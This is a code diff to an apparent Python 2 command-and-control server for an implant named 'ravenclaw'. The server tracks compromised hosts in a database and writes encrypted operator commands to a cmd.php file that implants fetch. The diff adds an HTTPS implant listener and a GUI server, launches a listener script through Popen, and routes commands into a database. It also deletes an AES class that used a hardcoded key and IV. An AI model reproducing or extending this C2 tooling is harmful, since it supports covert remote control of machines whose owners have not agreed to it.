@@ -1,6 +1,7 @@
 import BaseHTTPServer
 import SimpleHTTPServer
 import SocketServer
+from subprocess import Popen, PIPE
 import logging
 import cgi
 import ssl
@@ -13,44 +14,10 @@ from Crypto import Random
 
 import sqlite3
 
-PORT = 443
+from implants.ravenclaw.c2profile import *
+from lib.dbmgr import *
 
-class AESCipher:
-   def __init__( self, key ):
-      self.key = key
-      self.salt = "CorrectHorseBatteryStaple"
-      self.init = "Yet another key"
-
-   def encrypt( self, raw ):
-      word = map(ord, self.key) + map(ord, self.salt)
-      word = "".join(map(chr, word))
-      hash = hashlib.sha1(self.init).hexdigest()
-      bray = map(ord, hash.upper())[0:15]
-      hash = map(chr, bray)
-      iv = "".join(hash)
-      iv = iv[:-ord(iv[len(iv)-1:])]
-      
-      #iv = Random.new().read( AES.block_size )
-      #init = "abcdefghijklmnopqrstuvwxyz"
-      #iv = init[0:AES.block_size]
-      #AES.block_size = 0x80
-      iv = hashlib.sha1("test").hexdigest().upper()[0:16]
-      key = hashlib.sha1("test").hexdigest().upper()[0:16]
-      #raw = 'The answer is no'
-
-      #Pad CMDs
-      if len(raw) % 16 != 0:
-         raw += ' ' * (16 - len(raw) %16)
-
-      cipher = AES.new(key, AES.MODE_CBC, iv)
-      return base64.b64encode(cipher.encrypt(raw))
-
-   def decrypt( self, enc ):
-      enc = base64.b64decode(enc)
-      iv = enc[:16]
-      cipher = AES.new(self.key, AES.MODE_CBC, iv )
-      return unpad(cipher.decrypt( enc[16:] ))
-
+PORT = 8080
 
 class C2Handler:
    #def __init__( self, target):
@@ -59,10 +26,14 @@ class C2Handler:
    def formHandler(self, form):
       #if CMD
       #try:
-         print str(form).split(",")[0].split("'")[1]
+         #print str(form).split(",")[0].split("'")[1]
          #print str(form).split(",")[2].split("'")[1]
-         cmd = str(form).split(",")[2].split("'")[1]
-         self.execute(cmd)
+         cmd = str(form).split(",")[3].split("'")[1]
+         channel = str(form).split(",")[1].split("'")[1]
+         print "#####"
+         print cmd, channel
+         print "#####"
+         dbmgr().newInteraction("", channel, cmd, "", "0")
       #except:
          print form
 
@@ -72,24 +43,33 @@ class C2Handler:
       print cryptcmd
       os.system("echo " + cryptcmd + " > cmd.php")
 
-class dbmgr:
-   def __init__( self):
-      self.conn = sqlite3.connect('cerberus.db')
-      self.conn.commit()
-      self.cur = self.conn.cursor()
 
-   def getHosts(self):
-      query = self.cur.execute("SELECT id, host, context, description, status from hosts")
-      return query
+   def newListener(self):
+      import subprocess
 
-   def __del__(self):
-      #self.conn.close()
-      pass
+   #Need to incorporate into c2profile
+   def httpsListener(self):
+      LPORT = 443
 
+      print "Entering Thread"
+      os.chdir("implants/ravenclaw/")
 
+      Handler = ServerHandler
+      SocketServer.TCPServer.allow_reuse_address=True
+      listener = SocketServer.TCPServer(("", LPORT), Handler)
+      listener.socket = ssl.wrap_socket (listener.socket, certfile='../../cert.pem', server_side=True)
+      listener.serve_forever()
 
 class guiBuilder:
-   #def 
+   def guiServer(self):
+      print "Executing GUI Server Thread"
+      Handler = ServerHandler
+
+      SocketServer.TCPServer.allow_reuse_address=True
+      httpd = SocketServer.TCPServer(("", PORT), Handler)
+
+      httpd.socket = ssl.wrap_socket (httpd.socket, certfile='cert.pem', server_side=True)
+      httpd.serve_forever()
 
    def index(self):
       with open("gui/index.htm") as page:
@@ -130,7 +110,7 @@ class guiObjects:
          else:
             trclass = '<tr class = "widgetrowb">'
         
-         row = trclass + '<td width = "30%">' + host[1] + '</td><td width = "30%">' + host[2] + '</td><td width = "30%">' + host[3] + '</td><td width = "30%">' + host[4] + '<td></tr>'
+         row = trclass + '<td width = "30%">' + host[1] + '</td><td width = "30%">' + host[2] + '</td><td width = "30%">' + host[3] + '</td><td width = "30%">' + host[4] + '</td></tr>'
          table += row
          i = i + 1
 
@@ -170,13 +150,20 @@ class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
       C2Handler().formHandler(form.list)
 
-Handler = ServerHandler
 
-#httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
+
+#Start test listener
+print "Starting..."
+
+process = Popen(["python", "listeners/ravenclaw.py"], stdin=None, stdout=None, stderr=None)
+#stdout, stderr = process.communicate()
+
+print "Starting..."
+Handler = ServerHandler
 
 SocketServer.TCPServer.allow_reuse_address=True
 httpd = SocketServer.TCPServer(("", PORT), Handler)
 
-
 httpd.socket = ssl.wrap_socket (httpd.socket, certfile='cert.pem', server_side=True)
 httpd.serve_forever()
+
